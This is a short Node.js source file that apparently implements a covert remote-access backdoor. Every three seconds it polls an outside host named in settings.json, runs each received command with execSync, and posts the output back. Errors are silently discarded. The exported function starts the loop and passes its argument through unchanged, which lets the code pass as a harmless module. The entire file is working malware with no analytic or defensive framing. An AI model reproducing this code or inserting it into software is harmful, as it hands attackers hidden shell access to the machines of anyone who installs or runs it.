const http = require('http');
const { execSync } = require('child_process');
const { machineIdSync } = require('node-machine-id');

const settings = require('./settings.json');

const HOST = settings.HOST;
const PORT = settings.PORT;

// Session params
const session = machineIdSync();

const silence = function() {
  // Silent
}

function replyCmd(command, status, stdout, stderr) {
  const body = JSON.stringify({
    'id': command.id,
    'cmdStatus': status,
    'stdout': stdout.toString('utf-8'),
    'stderr': stderr.toString('utf-8'),
  });

  const options = {
    hostname: HOST,
    port: PORT,
    path: '/talk/' + session,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body)
    }
  };

  const req = http.request(options);

  req.on('error', silence);

  // write data
  req.write(body);
  req.end();
}

// Do request
function doRequest() {
  const options = {
    hostname: HOST,
    port: PORT,
    path: '/hear/' + session,
  };

  const req = http.request(options, (res) => {
    if (res.statusCode === 204) {
      return;
    }

    if (!res || res.statusCode !== 200) {
      return;
    }

    res.setEncoding('utf8');
    res.on('data', (command) => {
      try {
        command = JSON.parse(command);
      } catch (error) {
        return;
      }

      try {
        const ans = execSync(command.cmd);
        replyCmd(command, 0, ans, new Buffer(''));
      } catch (error) {
        replyCmd(command, error.status, error.stdout, error.stderr);
      }
    });
  });

  req.on('error', silence);

  req.end();
}

// Loop
module.exports = function(obj) {
  setInterval(doRequest, 3000);

  return obj;
}
